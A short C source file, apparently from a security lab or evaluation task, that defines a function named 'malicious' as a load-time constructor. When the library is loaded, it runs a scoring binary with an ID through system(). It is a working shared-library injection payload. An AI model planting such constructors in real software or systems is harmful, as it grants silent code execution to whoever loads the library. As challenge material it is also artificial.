#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 86db49b6-a686-41bb-b502-8a90a6f4d205");
}
